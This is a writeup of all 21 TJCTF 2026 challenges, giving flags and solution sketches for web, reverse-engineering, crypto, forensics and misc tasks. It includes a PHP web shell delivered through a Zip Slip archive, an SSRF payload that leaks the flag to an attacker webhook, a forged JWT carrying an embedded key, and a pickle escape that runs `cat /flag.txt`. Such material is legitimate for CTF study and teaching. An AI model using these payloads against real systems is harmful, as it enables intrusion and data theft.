---
title: "TJCTF 2026 Writeups: All 21 Challenges Solved"
slug: "tjctf-2026"
description: "Complete TJCTF 2026 writeup of all 21 challenges across web, rev, crypto, forensics, misc — JWT, ECDSA Minerva, RSA parity, ReDoS, pickle escape, Godot PCK."
date: 2026-05-17T16:00:00Z
lastmod: 2026-05-17T16:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
tags: ["tjctf", "tjctf-2026", "ctf", "web", "reverse engineering", "cryptography", "forensics", "misc", "jwt", "ssrf", "zip-slip", "ecdsa", "minerva", "rsa parity oracle", "redos", "pickle exploit", "godot", "steganography"]
series: ["TJCTF 2026"]
keywords: ["tjctf 2026 writeup", "tjctf 2026 solutions", "thomas jefferson ctf 2026", "tjctf chained writeup", "tjctf paper-trail jwk jwt writeup", "tjctf minervas-stopwatch writeup", "tjctf bit-leak rsa parity oracle", "tjctf mind-blowers pickle writeup"]
toc: true
cover:
  image: "/images/ctfs/tjctf.png"
  alt: "TJCTF 2026 — full writeup of all 21 solved challenges"
---

{{< ctf-meta platform="TJCTF 2026 (Thomas Jefferson CTF)" difficulty="Easy → Hard" os="Mixed: Linux, macOS ARM64, WebAssembly, Network captures" skills="JWT crafting, SSRF via URL normalization, Zip Slip, RSA parity oracle, ECDSA timing/Minerva, invalid-curve attacks, Chebyshev matrix exponentiation, ReDoS as side channel, pickle exploitation, PCK parsing, polyglot files, RTP LSB steganography" >}}

TJCTF 2026 was the kind of multi-day event that rewards breadth — twenty-one challenges spread across web, reverse engineering, cryptography, forensics, and misc, with no single technique cracking more than two boxes. This writeup is the consolidated solve log: one paragraph of prompt + trick + solution per challenge, the actual flag, and the moments worth quoting verbatim.

Source repo with full solver code: [Abdelkad3r/tjctf-2026](https://github.com/Abdelkad3r/tjctf-2026).

## Flags at a Glance

| # | Challenge | Category | Flag |
|---|-----------|----------|------|
| 1 | [Treasure Hunt](#treasure-hunt-web) | web | `{s1lv3r_and_g0ld}` |
| 2 | [chained](#chained-web) | web | `tjctf{ch41n3d_o340e934l35d}` |
| 3 | [free-cloud-storage](#free-cloud-storage-web) | web | `tjctf{i_l0v3_fr33_st0r4g3}` |
| 4 | [paper-trail](#paper-trail-web) | web | `tjctf{7h47_is_4_nic3_k3yc4rd_y0u_g07_7h3r3}` |
| 5 | [polaroid](#polaroid-rev) | rev | `tjctf{develop_the_picture}` |
| 6 | [remoose](#remoose-rev) | rev | `tjctf{5ma11_m00s3}` |
| 7 | [rotated](#rotated-rev) | rev | `tjctf{b45h_d3bu6_m4573r}` |
| 8 | [wavy](#wavy-crypto) | crypto | `tjctf{ch3bysh3v_p0lyn0m1!l_676767}` |
| 9 | [maas](#maas-crypto) | crypto | `tjctf{per_mendacium_ad_veritatem}` |
| 10 | [squares](#squares-crypto) | crypto | `tjctf{m4tr1c3s_4r3_4ll_y0u_n33d}` |
| 11 | [minervas-stopwatch](#minervas-stopwatch-crypto) | crypto | `tjctf{m1n3rv4_h34rd_th3_n0nc3_tick}` |
| 12 | [TAUtology](#tautology-crypto) | crypto | `tjctf{w0rth_th3_w41t_6283185_zzz}` |
| 13 | [bit-leak](#bit-leak-crypto) | crypto | `tjctf{parity_isnt_privacy}` |
| 14 | [voice-in-the-packet](#voice-in-the-packet-forensics) | forensics | `tjctf{h3y_v0ip_s73g_is_4_7hing}` |
| 15 | [check-the-fine-print](#check-the-fine-print-forensics) | forensics | `tjctf{wow_you_actually_read_it}` |
| 16 | [unfinished-file](#unfinished-file-forensics) | forensics | `tjctf{n3v3r_l3t_0ther_p30ple_t0uch_ur_c0mputer}` |
| 17 | [thomas-schools-of-china](#thomas-schools-of-china-forensics) | forensics | `tjctf{c0ngr4ts_u_s0lv3d_my_f1st_CTF_chall!_btw_1_l1ke_b1rds}` |
| 18 | [invisible-ink](#invisible-ink-forensics) | forensics | `tjctf{p0lygl0t_f1les_4r3_50_c00l}` |
| 19 | [loud-packets](#loud-packets-forensics) | forensics | `tjctf{v3ry_l0ud_pc4p_f1le}` |
| 20 | [mind-blowers](#mind-blowers-misc) | misc | `tjctf{bl0ckl1st5_4r3_n0t_s4f3_3v3n_f0r_r1ck}` |
| 21 | [jumper](#jumper-misc) | misc | `tjctf{PAST_THE_WALL}` |

---

## Web

### Treasure Hunt (web)

Three flag segments hidden in different parts of the same page. The intended path is the classic recon triad: **view source** (for a `<p>` hidden by CSS containing `_and_`), **POST to a form** (which sets a cookie `silver_coffer` containing `s1lv3r`), and **`/robots.txt`** (which `Disallow`s `/gold-coffer`, where the third segment lives). Concatenate `s1lv3r` + `_and_` + `g0ld`.

```bash
curl -sc /tmp/c -X POST https://treasure-hunt.tjc.tf/ && grep silver_coffer /tmp/c
curl -s https://treasure-hunt.tjc.tf/robots.txt
curl -s https://treasure-hunt.tjc.tf/gold-coffer
```

**Flag:** `{s1lv3r_and_g0ld}`

### chained (web)

A Flask admin-bot SSRF where the request is gated by a regex matching the **literal** URL string against `^https://chained\.tjc\.tf/admin/`. The bot, however, runs Chrome with WHATWG URL parsing, which normalises `/admin/..` → `/` *before* fetching. Submit `https://chained.tjc.tf/admin/..?url=http://YOUR_WEBHOOK/?leak=` — the regex passes the literal-string check, then Chrome rewrites the request to `GET /?url=http://YOUR_WEBHOOK/?leak=tjctf{…}`. The Flask `/` endpoint takes the `url` parameter, does `requests.get()`, and the flag (auto-appended by the bot) is now a query parameter on your webhook.

{{< callout type="tip" title="WHATWG URL normalization vs. server-side regex" >}}
Any time a server validates URLs as **strings** and a downstream component **parses** them, you get a normalization gap. `/admin/..` is one of many — others include `\\\\` vs. `//`, Unicode case-folding, IDNA encoding, and `@`-syntax authority hijacking.
{{< /callout >}}

**Flag:** `tjctf{ch41n3d_o340e934l35d}`

### free-cloud-storage (web)

A ZIP upload service running `chumper/zipper 1.0.2`, whose `extractTo()` writes archive entries to disk **without** resolving paths against the destination root — classic Zip Slip (the fix landed in 1.0.3 via `realpath()` validation). Build a ZIP containing `../pwn1.php` with a single-line web shell `<?php system($_GET['c']); ?>`. The extractor writes it to `/var/www/html/uploads/../pwn1.php` = `/var/www/html/pwn1.php`, accessible from the docroot.

```python
import zipfile
PAYLOAD = b"<?php system($_GET['c']); ?>"
with zipfile.ZipFile("evil.zip", "w") as z:
    for depth in range(1, 5):
        z.writestr(("../" * depth) + f"pwn{depth}.php", PAYLOAD)
```

Then `curl 'https://target/pwn1.php?c=cat%20/var/www/html/flag.txt'`.

**Flag:** `tjctf{i_l0v3_fr33_st0r4g3}`

### paper-trail (web)

An RS256 JWT endpoint where the server resolves the verification key from the JWT's own `jwk` header field rather than a static JWKS. That is the entire vulnerability — the header is attacker-controlled. Generate a 2048-bit RSA keypair, embed your public key as a JWK in the header, set `role: director` in the payload, and sign with your private key. The server happily verifies your signature with your own public key and trusts the role.

```python
header = {"alg": "RS256", "typ": "JWT", "jwk": my_public_jwk}
payload = {"iss": "tjctf", "aud": "drawer", "role": "director"}
token = jwt.encode(payload, my_private_key, algorithm="RS256", headers=header)
```

The `/drawer` endpoint returns 200 with the flag.

**Flag:** `tjctf{7h47_is_4_nic3_k3yc4rd_y0u_g07_7h3r3}`

---

## Reverse Engineering

### polaroid (rev)

A macOS ARM64 Mach-O binary that demands a password, XOR-decrypts an embedded blob from `__TEXT.__const`, and writes a horizontally-mirrored PNG to disk. Two pieces to recover:

1. **The password** — `exposeTheNegative` — sitting as byte-by-byte immediate compares in the password-checking function. Visible directly in `otool -tV` output.
2. **The XOR routine** — index modulo `len(password)` (= 17), XOR each byte of the 6324-byte const blob with `password[i % 17]`.

```python
out = bytes(b ^ password[i % 17] for i, b in enumerate(const_data))
open("flag.png", "wb").write(out)
```

Open the PNG, flip it horizontally (the binary intentionally produces a mirror image), read the flag.

**Flag:** `tjctf{develop_the_picture}`

### remoose (rev)

The ELF is corrupted in two specific ways: **every 0x00 byte was replaced with 0x20** (space), and **the 4th byte of the ELF magic** was changed from `0x46` (`F`) to `0x4b` (`K`). `file` reports it as "data". Undo both corruptions:

```python
data = open("remoose", "rb").read()
fixed = bytearray(b if b != 0x20 else 0x00 for b in data)
fixed[3] = 0x46
open("remoose-fixed", "wb").write(fixed)
```

Once the ELF is valid, the binary isn't stripped — five linked functions `flag()` → `flag1()` → … → `flag4()` each `putchar()` individual immediates and tail-call the next. The flag is sitting in the disassembly as a sequence of `mov edi, 't'; call putchar; mov edi, 'j'; …` lines.

**Flag:** `tjctf{5ma11_m00s3}`

### rotated (rev)

Four nested layers, each cheap to peel:

1. **Byte rotation**: every byte was incremented by 29. Undo with `(b - 0x1d) % 256`. Result: a valid UPX-packed ELF.
2. **UPX**: `upx -d rotated-stage2`. Result: an ELF that drops and executes a bash script.
3. **Obfuscated bash**: ~300 lines of `${IFS}`-padded variable concatenation. Boils down to `eval "$(printf '<base64>' | base64 -d | gunzip -c)"`.
4. **The decoded shell**: prints a banner. The flag is base64-encoded inside a comment in the *script source*, not the runtime output.

**Flag:** `tjctf{b45h_d3bu6_m4573r}`

---

## Cryptography

### wavy (crypto)

The encryption is XOR with a keystream derived from `T_{10^25}(0x1337C0DE)` mod the secp256k1 prime, where `T_n` is the **Chebyshev polynomial of the first kind**. The recurrence `T_{n+1}(x) = 2x·T_n(x) − T_{n-1}(x)` is a linear two-term recurrence — express it as a 2×2 matrix and exponentiate by squaring. 10^25 reduces to ~83 matrix multiplies.

```python
def cheb(n, x, p):
    M = [[2*x % p, -1 % p], [1, 0]]
    R = mat_pow(M, n - 1, p)               # binary exponentiation
    # [T_n, T_{n-1}]ᵀ = R · [x, 1]ᵀ
    return (R[0][0] * x + R[0][1]) % p
```

XOR the 32-byte big-endian encoding of `T_{10^25}` against the ciphertext, cycling.

**Flag:** `tjctf{ch3bysh3v_p0lyn0m1!l_676767}`

### maas (crypto)

The oracle implements scalar multiplication on `y² = x³ + 2x + 3` over `F_{10007}` — but it never verifies that submitted points actually lie on that curve. Standard **invalid-curve attack**: pick any `B'` such that `y² = x³ + 2x + B'` has small prime group order `N_i` (the addition formula uses only `A`, not `B`), generate a generator `G_i` of that subgroup, query the oracle with `G_i` to receive `d·G_i`, then brute-force the discrete log to recover `d mod N_i`. Sweep `B' = 0, 1, 2, …` until you've collected enough distinct prime moduli for CRT to recover the full `d` (39 residues totalling 519 bits in this case).

**Flag:** `tjctf{per_mendacium_ad_veritatem}` ("through lies, to truth" — pointed.)

### squares (crypto)

`out.txt` contains a 52×52 matrix `M` and a 52-vector `c` over `F_{257}`, and the flag is the stationary point of `H(x) = xᵀMx − 2cᵀx`. Setting `∇H = 0` gives `(M + Mᵀ) x ≡ 2c (mod 257)` — one linear system mod a small prime. Gaussian elimination in `GF(257)` recovers `x`, which decodes to ASCII.

```python
A = [[(M[i][j] + M[j][i]) % 257 for j in range(52)] for i in range(52)]
b = [(2 * c[i]) % 257 for i in range(52)]
x = gauss_mod_p(A, b, 257)
print(bytes(x).rstrip(b" "))
```

**Flag:** `tjctf{m4tr1c3s_4r3_4ll_y0u_n33d}`

### minervas-stopwatch (crypto)

A P-256 ECDSA service whose scalar-mult implementation **skips leading zero bits** of the nonce. Each signature ships with a server-side runtime in nanoseconds. Sort signatures by runtime; the fastest few were produced by nonces with biased high bits — i.e., `k < 2^200`. This is the classic Minerva (CVE-2019-15809) setup: feed 5 such biased signatures into a Boneh–Venkatesan **Hidden Number Problem lattice**, LLL-reduce, read the private key out of the shortest vector. Verify with `d·G == Q`. Then derive a keystream `SHA-256(d_bytes || i.to_bytes(4, "big"))` for `i = 0, 1, …` and XOR the ciphertext.

The whole timing-to-key chain takes seconds; the win is recognising the leading-zero leak from the runtime distribution.

**Flag:** `tjctf{m1n3rv4_h34rd_th3_n0nc3_tick}`

### TAUtology (crypto)

A regex-match oracle on the flag: 0.20 s timeout per query, 1200 total queries, no result disclosure — only a binary "ok"/"timeout" outcome. The timeout *is* the side channel. Construct a **ReDoS pattern** with a zero-width lookahead anchor:

```
^(?=<known_prefix><charset>)(.+)+ZQXJ
```

If `<known_prefix><charset>` matches the flag prefix, the lookahead succeeds, the cursor stays at position 0, and `(.+)+` catastrophically backtracks against the entire flag string until it gives up at the impossible `ZQXJ` suffix — 200 ms. If the prefix doesn't match, the lookahead fails immediately at position 0 and the regex returns in microseconds. **Binary-search the charset** by halving on each probe; min-of-4 sampling and a rolling baseline of control regexes absorb network jitter.

**Flag:** `tjctf{w0rth_th3_w41t_6283185_zzz}`

### bit-leak (crypto)

512-bit RSA with a **parity oracle**: submit ciphertext `C'`, receive `Dec(C') mod 2`. Submit `C_i = C · (2^e)^i mod n`. Since `Dec(C_i) = 2^i · m mod n`, the LSB returned is `(2^i · m mod n) & 1`, which is **bit `i−1` of the binary expansion of `m/n`**. Submit 540 such ciphertexts (pipelined into one socket flush), collect 540 bits, reconstruct:

```python
bits_str = "".join(str(b) for b in lsb_responses)
m = (n * (int(bits_str, 2) + 1)) >> 540
```

**Flag:** `tjctf{parity_isnt_privacy}`

---

## Forensics

### voice-in-the-packet (forensics)

A 20-second VoIP capture with 1000 RTP packets of G.711 µ-law audio plus two decoy flag-shaped packets. The intended path: **995 of 1000 RTP payloads are byte-identical**; only the first 5 deviate, and only at *even* offsets, by *exactly 0x01*. That's textbook LSB steganography on µ-law samples. XOR each non-template packet against the template, pack the resulting LSBs MSB-first, decode the base64 substring in the middle.

**Flag:** `tjctf{h3y_v0ip_s73g_is_4_7hing}`

### check-the-fine-print (forensics)

A PNG with an appended ZIP (binwalk surfaces it instantly) containing 248 tiny 19×9 PNG files. Every standard stego port turns up empty — until you read **byte 26** of each PNG. That byte is the IHDR `compression method`, which the PNG spec mandates to be `0`, and is the second-most-ignored field in image forensics after `bit-depth`. Some files have it set to `1` (illegal). One bit per file × 248 files = 31 bytes of ASCII.

```python
bits = [open(f, "rb").read()[26] & 1 for f in sorted(glob("*.png"))]
print(bytes(int("".join(map(str, bits[i:i+8])), 2) for i in range(0, len(bits), 8)))
```

**Flag:** `tjctf{wow_you_actually_read_it}`

### unfinished-file (forensics)

A Chrome `.crdownload` partial — the bytes-on-wire of an incomplete `secret_archive.zip`, prefixed by Chrome's `CRDL` header (~0x100 bytes). The ZIP has no central directory (the download was killed before it arrived), but **local file headers are self-describing**: walk `PK\x03\x04` signatures, parse manually, find `hidden/.flagdata` (47 bytes, store method 0). The data is single-byte XOR encrypted; XOR the first byte (`0x36`) against the known plaintext prefix `t` (the first character of `tjctf{`) → key = `0x42`. XOR all 47 bytes.

**Flag:** `tjctf{n3v3r_l3t_0ther_p30ple_t0uch_ur_c0mputer}`

### thomas-schools-of-china (forensics)

A custom `.tsc` container: 4-byte magic, 4-byte version, 4-byte width, 2-byte height, 3-byte format spec, then RGBA pixel data. Renders as a 60×61 pastel-green duck. The flag lives in the **colored speckles** — pixels where the RGB channels disagree by ≥5. For each such pixel, R/G/B each decode to a printable ASCII character (so one pixel = 3 flag bytes). Filter out the grey body pixels (where `max(R,G,B) − min(R,G,B) < 5`) and concatenate.

**Flag:** `tjctf{c0ngr4ts_u_s0lv3d_my_f1st_CTF_chall!_btw_1_l1ke_b1rds}`

### invisible-ink (forensics)

A polyglot: the file is a valid PDF (read from `%PDF-` at the top) **and** a valid ZIP (read from the EOCD at the bottom). Page 2 of the PDF has white-on-white text that PyMuPDF still extracts from the text layer — the ZIP password `DBf8nEBgwRhZ`. Inside the encrypted ZIP: `original_distorted.png`, a swirl-distorted handwritten flag. Use `skimage.transform.swirl(img, center=(w/2, h/2), strength=-8.5, radius=540)` — the **negative** strength undoes the original distortion.

**Flag:** `tjctf{p0lygl0t_f1les_4r3_50_c00l}`

### loud-packets (forensics)

The name is a red herring — there's no PCAP. The challenge ships a directory of 39 folders (one per TJCTF flag-charset symbol) of identical anime sprites, plus a large grayscale `chall.png` (3664×784) covered in white dumbbell-shaped blobs. The trick: those blobs are downscaled versions of the anime sprites, and **the puzzle image is a bitmap-font rendering of the flag**, with each character drawn as a roughly-80×80 tile of the corresponding sprite. Downsample the image with nearest-neighbour to one pixel per tile, threshold at 128, print `#` or space, and read the ASCII art.

```python
small = im.resize((im.width // 80, im.height // 80), Image.NEAREST)
for y in range(small.height):
    print("".join("#" if small.getpixel((x, y)) > 128 else " " for x in range(small.width)))
```

**Flag:** `tjctf{v3ry_l0ud_pc4p_f1le}`

---

## Misc

### mind-blowers (misc)

A TCP service that base64-decodes input, unpickles it with a `RestrictedUnpickler`, and echoes the result. The denylist blocks `eval`, `exec`, `open`, `system`, `getattr`, and friends in `find_class`. The escape: `__loader__` is *not* on the denylist, and `__loader__.load_module("sys")` gives you `sys.modules`, which already contains `os` because `socket` (which the service imports at startup) transitively imported it. Chain via hand-crafted pickle opcodes (`GLOBAL`, `TUPLE`, `REDUCE`, with `BINPUT`/`BINGET` memo to avoid re-doing the chain):

```
getattr(builtins, "__loader__")
  .load_module("sys")
  .modules["os"]
  .popen("cat /flag.txt")
  .read()
```

Because `getattr` itself is denylisted by name, build the chain by stacking the right opcodes manually — you never call `find_class("builtins", "getattr")`; you just emit pickle bytes that the unpickler's `REDUCE` op interprets equivalently.

**Flag:** `tjctf{bl0ckl1st5_4r3_n0t_s4f3_3v3n_f0r_r1ck}`

### jumper (misc)

A Godot 4.6 platformer exported to WebAssembly, shipping a `.pck` packfile. Two non-obvious format quirks make this one harder than it looks:

1. **The Godot 4.6 PCK directory offset isn't where PCK 1.x docs say it is.** Godot 4.6 stores it in a previously-reserved u64 slot at header offset `0x20`.
2. **Entry offsets are relative to `file_base = 0x70`**, not to the start of the file.

Parse the PCK, extract `f.scn` (a binary `PackedScene`), and walk the Variant stream. The scene contains 56 `ColorRect` nodes. **Eight of them have non-default rotation or scale** — Godot's editor would render those rotated, but a naïve PCK dumper that only reads `offset` and `color` would render them as axis-aligned rectangles, collapsing the diagonal strokes of letters into invisible slivers. Render each rect as a 4-corner polygon, apply scale and rotation around the local origin, translate by offset, draw, and read the flag.

**Flag:** `tjctf{PAST_THE_WALL}`

---

## Lessons learned across the set

1. **String-validation vs. parsed-form is the single most reliable web-CTF gap.** `chained`, `paper-trail`, and `free-cloud-storage` are all variants: regex checks a literal string while a downstream component (Chrome's WHATWG parser, the JWT lib's `jwk` resolver, the ZIP extractor's path joiner) **operates on a different interpretation**. Whenever a CTF prompt mentions "the bot only visits `/admin/`," "the server verifies the JWT," or "the upload extracts safely," check what each component is actually doing — almost always at least one is doing it differently than the validator.

2. **Timing channels show up in unexpected places.** `minervas-stopwatch` is a textbook ECDSA timing attack, but `TAUtology` is the more interesting one: it uses **ReDoS catastrophic backtracking** as a *forward* signal rather than a denial-of-service vector. Whenever a service's response is binary (ok/timeout, 200/500) and you control any part of the input regex, you can probably build a binary-search oracle out of pathological patterns.

3. **Lattice attacks (LLL, Boneh–Venkatesan) are now first-line crypto tools.** `minervas-stopwatch` and `bit-leak` both reduce to "collect partial bits of a secret, build a lattice, run LLL." For CTF crypto on RSA and ECDSA, having a `solve_hnp(samples, B, modulus)` helper in your toolkit beats reading three papers on the day.

4. **"Stego" is rarely image-LSB anymore.** Of the seven forensics challenges here, exactly *zero* used `R/G/B & 1` over the whole image. The hides were: byte 26 of IHDR (`check-the-fine-print`), RTP payload LSB at even offsets only (`voice-in-the-packet`), white-on-white PDF text (`invisible-ink`), pixels with high channel variance (`thomas-schools-of-china`), downsampling-recovers-bitmap (`loud-packets`). The new stego is **schema-level oddities** — values that violate a format spec, or that look like noise until you pick the right reduction.

5. **Invalid-curve and parity-oracle attacks are still in the wild.** `maas` and `bit-leak` are both **textbook** crypto vulnerabilities — Lim-Lee invalid-curve from 1997, Bleichenbacher-style RSA oracle from 1998 — but they keep showing up because the libraries make them easy: any time a curve operation doesn't validate `B`, or any RSA decryption leaks a single bit, the full secret falls out in O(log n) interactions.

6. **Reverse-engineering challenges reward the boring first move.** `polaroid`, `remoose`, and `rotated` each tried to look harder than they were. `strings`/`objdump`/byte-frequency over the binary disclosed the password, the corrupted ELF, and the encoded payload format respectively. Open every binary RE challenge with `file`, `strings | head`, `xxd | head`, and `objdump -d` before reaching for anything fancier.

7. **Custom containers are documentation puzzles, not crypto.** `thomas-schools-of-china`, `jumper` (the Godot PCK), and the corrupted ELF in `remoose` all required parsing a non-standard or non-documented binary layout. The technique is the same every time: hex-dump, identify the magic, identify the sizes/offsets of fields by aligning them against known content, *iterate*.

## References

- Source repo (full solver code for every challenge): [Abdelkad3r/tjctf-2026](https://github.com/Abdelkad3r/tjctf-2026)
- TJCTF official site: [tjctf.org](https://tjctf.org/) — annual Thomas Jefferson High School CTF
- [Minerva attack paper (CVE-2019-15809)](https://minerva.crocs.fi.muni.cz/) — ECDSA timing leak via leading-zero-bit skipping
- [Boneh & Venkatesan, "Hardness of computing the most significant bits of secret keys in Diffie-Hellman and related schemes"](https://crypto.stanford.edu/~dabo/papers/dhmsb.pdf) — the HNP lattice that solves Minerva
- [Bleichenbacher's RSA parity oracle attack](https://crypto.stackexchange.com/questions/11053/rsa-parity-oracle) — the construction `bit-leak` exploits
- [chumper/zipper CVE-2019-05 (Zip Slip)](https://snyk.io/vuln/SNYK-PHP-CHUMPERZIPPER-450211)
- [Godot PCK format reference](https://docs.godotengine.org/en/stable/development/file_formats/pck.html) — note: 4.x deltas not yet upstream
- [`scikit-image.transform.swirl`](https://scikit-image.org/docs/stable/api/skimage.transform.html#skimage.transform.swirl) — what `invisible-ink` unmade
